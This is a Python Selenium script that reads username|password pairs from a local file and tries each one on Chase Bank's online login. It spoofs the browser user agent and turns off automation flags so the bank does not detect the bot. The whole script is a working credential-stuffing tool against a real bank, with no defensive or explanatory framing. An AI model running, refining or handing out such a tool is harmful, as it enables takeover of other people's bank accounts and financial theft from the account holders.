from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
 
import time
 
options = Options()
options.headless = False
options.add_argument('log-level=3')
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)
options.add_argument('--no-sandbox')
options.add_argument('--disable-blink-features=AutomationControlled')
options.add_argument(f'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36')


print("[*] Automation Login Chase Bank")
 
myfile = open("E:/UTS.txt","r")
list_account = myfile.read()
list_accountsplit = list_account.split()

for i in list_accountsplit:
    # print(i)
    k = i.split("|")
    username = k[0]
    password = k[1]

    print("[*] Username: ", username)
    print("[*] Password: ", password)
    
    browser = webdriver.Chrome(options=options, executable_path=r"C:\Users\User\Downloads\chrome\chromedriver.exe")
    browser.get("https://secure05b.chase.com/web/auth/dashboard#/dashboard/overviewAccounts/overview/index")
    time.sleep(10)    
    wait(browser, 10).until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR,"iframe[src^='/web/auth/?fromOrigin=https://secure05b.chase.com']")))
    fill_name = wait(browser,20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="userId-text-input-field"]')))
    fill_name.clear()
    fill_name.send_keys(username)
    
    fill_passwd = wait(browser,20).until(EC.presence_of_element_located((By.XPATH,'//*[@id="password-text-input-field"]')))
    fill_passwd.clear() 
    fill_passwd.send_keys(password)

    click_submit = wait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="signin-button"]'))) 
    click_submit.click()
    time.sleep(5)
   

